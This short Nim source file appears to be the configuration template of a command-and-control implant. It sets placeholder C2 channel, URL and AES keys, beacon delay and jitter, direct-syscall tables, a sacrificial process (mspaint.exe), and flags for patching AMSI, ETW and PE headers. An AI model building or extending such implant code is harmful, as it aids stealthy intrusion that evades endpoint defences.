const obfuscationType* = "<obfuscationType>"

from crypt/xordec import fromXor
from crypt/rc4 import fromRC4
include "../macro"
import tables

var channel* = obf("<channel>")
var url* = obf("<url>")
var hostTag* = obf("<hostTag>")
var beaconDelay* = 867530903
var jitter* = 867530902
var relayTimeout* = 5 * 60 * 1000
var pipelineTarget* = obf("<pipelineTarget>")
var aesId* = obf("<aesId>")
var aesKey* = "<aesKey>"
var aesRelayKey* = "<aesRelayKey>"
const sleepMask* = "<sleepMask>"
var syscallMethod* = obf("<syscallMethod>")
var syscallReady* = false
var ssns* = initTable[string, culong]()
var syscallStubs* = initTable[string, pointer]()
var sacrificeProcess* = obf(r"C:\Windows\System32\mspaint.exe")
var etwPatch* = obf("<etwPatch>")
var amsiPatch* = obf("<amsiPatch>")
var amsiAlreadyPatched* = false
var etwAlreadyPatched* = false
var peHeadersPatch* = obf("<peHeadersPatch>")
var peHeadersPatched* = false
var bgWorkers* = 0
